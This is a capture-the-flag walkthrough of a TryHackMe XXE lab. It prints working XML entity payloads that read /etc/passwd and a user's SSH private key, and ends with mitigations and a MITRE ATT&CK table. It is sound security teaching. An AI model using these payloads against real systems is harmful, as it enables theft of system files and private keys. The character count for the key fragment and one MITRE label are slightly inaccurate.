# 🧩 XML External Entity (XXE) – TryHackMe Walkthrough

## 📝 Overview

This challenge demonstrates how **improperly configured XML parsers** can allow attackers to inject malicious XML entities, enabling them to read sensitive files from the server. XXE attacks can lead to information disclosure, SSRF, and even remote code execution in some cases.

---

## 🎯 Lab Objective

* Validate the XXE vulnerability by injecting a custom payload.
* Read the `/etc/passwd` file to enumerate users.
* Locate and extract the SSH private key of a specific user.

---

## 🛠 Steps to Exploit

### ✅ 1. Confirming XXE with Custom Payload

* Injected the following payload to confirm XXE:

  ```xml
  <?xml version="1.0" encoding="ISO-8859-1"?>
  <!DOCTYPE foo [
  <!ELEMENT foo ANY >
  <!ENTITY xxe "falcon feast">
  ]>
  <foo>&xxe;</foo>
  ```

* **Result:** The application displayed `falcon feast`, confirming the XXE vulnerability.

---

### ✅ 2. Reading `/etc/passwd`

* Modified the payload to read system files:

  ```xml
  <?xml version="1.0" encoding="ISO-8859-1"?>
  <!DOCTYPE foo [
  <!ELEMENT foo ANY >
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
  ]>
  <foo>&xxe;</foo>
  ```

* **Result:** Retrieved system user details. The relevant user entry was:

  ```
  falcon:x:1000:1000:falcon:/home/falcon:/bin/bash
  ```

---

### ✅ 3. Locating the SSH Private Key

* Based on Linux conventions, SSH keys are typically stored in the `.ssh` directory of a user’s home folder.

* **Key Location:**

  ```
  /home/falcon/.ssh/id_rsa
  ```

---

### ✅ 4. Extracting the SSH Private Key

* Used XXE to read the private SSH key:

  ```xml
  <?xml version="1.0" encoding="ISO-8859-1"?>
  <!DOCTYPE foo [
  <!ELEMENT foo ANY >
  <!ENTITY xxe SYSTEM "file:///home/falcon/.ssh/id_rsa">
  ]>
  <foo>&xxe;</foo>
  ```

* **Result:** Retrieved the private key. The first 18 characters were:

  ```
  MIIEogIBAAKCAQEA7
  ```

---

## ✅ Key Takeaways

* **Root Cause:** XML parser was configured to allow external entity resolution.
* **Impact:** Sensitive file disclosure, potential lateral movement using SSH access.
* **Mitigation:**

  * Disable **DTD (Document Type Definition)** processing in XML parsers.
  * Use secure parsers that block external entities by default.
  * Validate and sanitize all XML inputs.

---

## 🗺 MITRE ATT\&CK Mapping

| **Technique**                         | **ID**                                                      | **Description**                                                                |
| ------------------------------------- | ----------------------------------------------------------- | ------------------------------------------------------------------------------ |
| **Exfiltration Over Web Service**     | [T1567.002](https://attack.mitre.org/techniques/T1567/002/) | Adversaries exfiltrate sensitive files by exploiting exposed web services.     |
| **Exploit Public-Facing Application** | [T1190](https://attack.mitre.org/techniques/T1190/)         | Adversaries exploit vulnerable applications to gain unauthorized access/files. |
